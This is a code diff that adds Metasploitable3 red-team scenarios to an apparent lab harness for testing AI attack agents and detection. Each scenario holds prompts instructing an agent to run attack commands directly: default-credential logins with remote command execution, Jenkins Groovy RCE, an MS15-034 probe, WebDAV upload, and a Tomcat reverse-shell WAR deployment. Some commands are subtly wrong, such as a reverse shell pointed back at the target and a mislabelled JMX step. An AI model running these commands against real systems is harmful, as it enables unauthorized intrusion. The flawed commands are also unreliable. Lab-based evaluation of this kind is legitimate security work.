@@ -1266,6 +1266,232 @@ SCENARIOS: dict[str, dict] = {
         "detect_ground_truth": ["T1190", "T1059.004", "T1078", "T1548.001"],
         "persistence_technique": "",
     },
+    # ── meta3 expansion: WinRM, Tomcat, Jenkins, GlassFish ─────────────────
+    "meta3_winrm_weakpass": {
+        "name": "meta3_winrm_weakpass",
+        "target_host": _LAB_META3,
+        "vulhub_env": None,
+        "difficulty": "easy",
+        "red_order": ["execute_bash", "execute_bash"],
+        "red_prompt": (
+            "Authorized pentest: WinRM brute-force on Metasploitable3-Windows at $TARGET_HOST. "
+            "Use execute_bash for each step. "
+            "(1) call execute_bash with cmd='nxc winrm $TARGET_HOST -u vagrant -p vagrant 2>&1' to test default creds, "
+            "(2) call execute_bash with cmd='nxc winrm $TARGET_HOST -u vagrant -p vagrant -X \"whoami\" 2>&1' to confirm execution. "
+            "Do not describe — call the tools."
+        ),
+        "detect_ground_truth": ["T1110.003", "T1021.002", "T1078"],
+        "persistence_technique": "",
+    },
+    "meta3_tomcat_manager": {
+        "name": "meta3_tomcat_manager",
+        "target_host": _LAB_META3,
+        "vulhub_env": None,
+        "difficulty": "medium",
+        "red_order": ["execute_bash", "execute_bash", "execute_bash"],
+        "red_prompt": (
+            "Authorized pentest: Tomcat Manager exploit on Metasploitable3-Windows at $TARGET_HOST. "
+            "Use execute_bash for each step. "
+            "(1) call execute_bash with cmd='curl -s -o /dev/null -w \"%{http_code}\" http://$TARGET_HOST:8080/manager/html 2>&1' to check Manager access, "
+            "(2) call execute_bash with cmd='curl -u tomcat:tomcat -T /dev/null http://$TARGET_HOST:8080/manager/text/deploy?path=/test 2>&1' to test default creds, "
+            "(3) call execute_bash with cmd='msfvenom -p java/jsp_shell_reverse_tcp LHOST=$TARGET_HOST LPORT=4444 -f war -o shell.war 2>&1 && curl -u tomcat:tomcat -T shell.war \"http://$TARGET_HOST:8080/manager/text/deploy?path=/shell\" 2>&1' to deploy shell. "
+            "Do not describe — call the tools."
+        ),
+        "detect_ground_truth": ["T1190", "T1059", "T1078"],
+        "persistence_technique": "T1505.003",
+    },
+    "meta3_jenkins_rce": {
+        "name": "meta3_jenkins_rce",
+        "target_host": _LAB_META3,
+        "vulhub_env": None,
+        "difficulty": "medium",
+        "red_order": ["execute_bash", "execute_bash"],
+        "red_prompt": (
+            "Authorized pentest: Jenkins RCE on Metasploitable3-Windows at $TARGET_HOST. "
+            "Use execute_bash for each step. "
+            "(1) call execute_bash with cmd='curl -s http://$TARGET_HOST:8080/login 2>&1 | head -20' to confirm Jenkins, "
+            "(2) call execute_bash with cmd='curl -s \"http://$TARGET_HOST:8080/script\" -u admin:admin -d \"script=println(\\\"id\\\".execute().text)\" 2>&1' to test Groovy script console. "
+            "Do not describe — call the tools."
+        ),
+        "detect_ground_truth": ["T1190", "T1059", "T1078"],
+        "persistence_technique": "",
+    },
+    "meta3_glassfish_deploy": {
+        "name": "meta3_glassfish_deploy",
+        "target_host": _LAB_META3,
+        "vulhub_env": None,
+        "difficulty": "medium",
+        "red_order": ["execute_bash", "execute_bash"],
+        "red_prompt": (
+            "Authorized pentest: GlassFish admin console on Metasploitable3-Windows at $TARGET_HOST. "
+            "Use execute_bash for each step. "
+            "(1) call execute_bash with cmd='curl -s -o /dev/null -w \"%{http_code}\" http://$TARGET_HOST:4848/ 2>&1' to check GlassFish admin, "
+            "(2) call execute_bash with cmd='curl -s \"http://$TARGET_HOST:4848/management/domain/applications/application\" -H \"Accept: application/json\" 2>&1 | head -30' to enumerate apps. "
+            "Do not describe — call the tools."
+        ),
+        "detect_ground_truth": ["T1190", "T1078"],
+        "persistence_technique": "",
+    },
+    "meta3_struts_rce": {
+        "name": "meta3_struts_rce",
+        "target_host": _LAB_META3,
+        "vulhub_env": None,
+        "difficulty": "medium",
+        "red_order": ["execute_bash", "execute_bash"],
+        "red_prompt": (
+            "Authorized pentest: Apache Struts REST showcase RCE on Metasploitable3-Windows at $TARGET_HOST. "
+            "Use execute_bash for each step. "
+            "(1) call execute_bash with cmd='curl -s http://$TARGET_HOST:8282/struts2-rest-showcase/ 2>&1 | head -20' to confirm Struts, "
+            "(2) call execute_bash with cmd='curl -s -H \"Content-Type: application/x-www-form-urlencoded\" -d \"redirect:http://$TARGET_HOST:8282/struts2-rest-showcase/\" http://$TARGET_HOST:8282/struts2-rest-showcase/orders/3 2>&1 | head -20' to test OGNL injection. "
+            "Do not describe — call the tools."
+        ),
+        "detect_ground_truth": ["T1190", "T1059"],
+        "persistence_technique": "",
+    },
+    "meta3_iis_http": {
+        "name": "meta3_iis_http",
+        "target_host": _LAB_META3,
+        "vulhub_env": None,
+        "difficulty": "easy",
+        "red_order": ["execute_bash", "execute_bash"],
+        "red_prompt": (
+            "Authorized pentest: IIS HTTP exploit on Metasploitable3-Windows at $TARGET_HOST. "
+            "Use execute_bash for each step. "
+            "(1) call execute_bash with cmd='curl -s -o /dev/null -w \"%{http_code}\" http://$TARGET_HOST/ 2>&1' to confirm IIS, "
+            "(2) call execute_bash with cmd='curl -s http://$TARGET_HOST/ -H \"Range: bytes=0-18446744073709551615\" 2>&1 | head -10' to test MS15-034. "
+            "Do not describe — call the tools."
+        ),
+        "detect_ground_truth": ["T1190", "T1059"],
+        "persistence_technique": "",
+    },
+    "meta3_psexec": {
+        "name": "meta3_psexec",
+        "target_host": _LAB_META3,
+        "vulhub_env": None,
+        "difficulty": "medium",
+        "red_order": ["execute_bash", "execute_bash"],
+        "red_prompt": (
+            "Authorized pentest: psexec remote execution on Metasploitable3-Windows at $TARGET_HOST. "
+            "Use execute_bash for each step. "
+            "(1) call execute_bash with cmd='nxc smb $TARGET_HOST -u vagrant -p vagrant 2>&1 | head -10' to test SMB creds, "
+            "(2) call execute_bash with cmd='nxc smb $TARGET_HOST -u vagrant -p vagrant -X \"whoami\" 2>&1' to execute via psexec. "
+            "Do not describe — call the tools."
+        ),
+        "detect_ground_truth": ["T1021.002", "T1078", "T1059"],
+        "persistence_technique": "",
+    },
+    "meta3_ssh_brute": {
+        "name": "meta3_ssh_brute",
+        "target_host": _LAB_META3,
+        "vulhub_env": None,
+        "difficulty": "easy",
+        "red_order": ["execute_bash", "execute_bash"],
+        "red_prompt": (
+            "Authorized pentest: SSH brute-force on Metasploitable3-Windows at $TARGET_HOST. "
+            "Use execute_bash for each step. "
+            "(1) call execute_bash with cmd='nxc ssh $TARGET_HOST -u vagrant -p vagrant 2>&1 | head -10' to test default creds, "
+            "(2) call execute_bash with cmd='sshpass -p vagrant ssh -o StrictHostKeyChecking=no vagrant@$TARGET_HOST \"whoami\" 2>&1' to confirm shell. "
+            "Do not describe — call the tools."
+        ),
+        "detect_ground_truth": ["T1110.003", "T1078", "T1059"],
+        "persistence_technique": "",
+    },
+    "meta3_manageengine": {
+        "name": "meta3_manageengine",
+        "target_host": _LAB_META3,
+        "vulhub_env": None,
+        "difficulty": "medium",
+        "red_order": ["execute_bash", "execute_bash"],
+        "red_prompt": (
+            "Authorized pentest: ManageEngine Desktop Central on Metasploitable3-Windows at $TARGET_HOST. "
+            "Use execute_bash for each step. "
+            "(1) call execute_bash with cmd='curl -s -o /dev/null -w \"%{http_code}\" http://$TARGET_HOST:8020/ 2>&1' to confirm ManageEngine, "
+            "(2) call execute_bash with cmd='curl -s http://$TARGET_HOST:8020/ -u admin:admin 2>&1 | head -20' to test default creds. "
+            "Do not describe — call the tools."
+        ),
+        "detect_ground_truth": ["T1190", "T1078"],
+        "persistence_technique": "",
+    },
+    "meta3_axis2_deploy": {
+        "name": "meta3_axis2_deploy",
+        "target_host": _LAB_META3,
+        "vulhub_env": None,
+        "difficulty": "medium",
+        "red_order": ["execute_bash", "execute_bash"],
+        "red_prompt": (
+            "Authorized pentest: Apache Axis2 deployer on Metasploitable3-Windows at $TARGET_HOST. "
+            "Use execute_bash for each step. "
+            "(1) call execute_bash with cmd='curl -s http://$TARGET_HOST:8282/axis2/ 2>&1 | head -20' to confirm Axis2, "
+            "(2) call execute_bash with cmd='curl -s http://$TARGET_HOST:8282/axis2/axis2-admin/ -u axis2:axis2 2>&1 | head -20' to test default admin creds. "
+            "Do not describe — call the tools."
+        ),
+        "detect_ground_truth": ["T1190", "T1078", "T1059"],
+        "persistence_technique": "",
+    },
+    "meta3_webdav_upload": {
+        "name": "meta3_webdav_upload",
+        "target_host": _LAB_META3,
+        "vulhub_env": None,
+        "difficulty": "medium",
+        "red_order": ["execute_bash", "execute_bash"],
+        "red_prompt": (
+            "Authorized pentest: WebDAV file upload on Metasploitable3-Windows at $TARGET_HOST. "
+            "Use execute_bash for each step. "
+            "(1) call execute_bash with cmd='curl -s -X OPTIONS http://$TARGET_HOST:8585/ 2>&1 | grep -i dav' to confirm WebDAV, "
+            "(2) call execute_bash with cmd='curl -s -T /dev/null http://$TARGET_HOST:8585/test.txt 2>&1' to test PUT upload. "
+            "Do not describe — call the tools."
+        ),
+        "detect_ground_truth": ["T1190", "T1505.003"],
+        "persistence_technique": "T1505.003",
+    },
+    "meta3_snmp_enum": {
+        "name": "meta3_snmp_enum",
+        "target_host": _LAB_META3,
+        "vulhub_env": None,
+        "difficulty": "easy",
+        "red_order": ["execute_bash", "execute_bash"],
+        "red_prompt": (
+            "Authorized pentest: SNMP enumeration on Metasploitable3-Windows at $TARGET_HOST. "
+            "Use execute_bash for each step. "
+            "(1) call execute_bash with cmd='snmpwalk -v2c -c public $TARGET_HOST 2>&1 | head -30' to enumerate SNMP, "
+            "(2) call execute_bash with cmd='snmpwalk -v2c -c public $TARGET_HOST 1.3.6.1.4.1.77.1.2.25 2>&1 | head -20' to enumerate users. "
+            "Do not describe — call the tools."
+        ),
+        "detect_ground_truth": ["T1592", "T1046"],
+        "persistence_technique": "",
+    },
+    "meta3_jmx_rce": {
+        "name": "meta3_jmx_rce",
+        "target_host": _LAB_META3,
+        "vulhub_env": None,
+        "difficulty": "medium",
+        "red_order": ["execute_bash", "execute_bash"],
+        "red_prompt": (
+            "Authorized pentest: JMX RCE on Metasploitable3-Windows at $TARGET_HOST. "
+            "Use execute_bash for each step. "
+            "(1) call execute_bash with cmd='nmap -sV -p 1617 $TARGET_HOST 2>&1' to confirm JMX port, "
+            "(2) call execute_bash with cmd='java -cp metasploit-JRMPClient.jar MetasploitJRMPServer 1617 2>&1' to test JMX exploit. "
+            "Do not describe — call the tools."
+        ),
+        "detect_ground_truth": ["T1190", "T1059"],
+        "persistence_technique": "",
+    },
+    "meta3_wordpress_ninja": {
+        "name": "meta3_wordpress_ninja",
+        "target_host": _LAB_META3,
+        "vulhub_env": None,
+        "difficulty": "medium",
+        "red_order": ["execute_bash", "execute_bash"],
+        "red_prompt": (
+            "Authorized pentest: WordPress NinjaForms exploit on Metasploitable3-Windows at $TARGET_HOST. "
+            "Use execute_bash for each step. "
+            "(1) call execute_bash with cmd='curl -s http://$TARGET_HOST:8585/wordpress/ 2>&1 | head -20' to confirm WordPress, "
+            "(2) call execute_bash with cmd='curl -s \"http://$TARGET_HOST:8585/wordpress/wp-admin/admin-ajax.php\" -d \"action=ninja_forms_ajax_submit\" 2>&1 | head -20' to test NinjaForms. "
+            "Do not describe — call the tools."
+        ),
+        "detect_ground_truth": ["T1190", "T1059"],
+        "persistence_technique": "",
+    },
     # ── Vulhub expansion: ~36 new categories → ~50 total ────────────────────
     "vuln_struts2_rce": {
         "name": "vuln_struts2_rce",
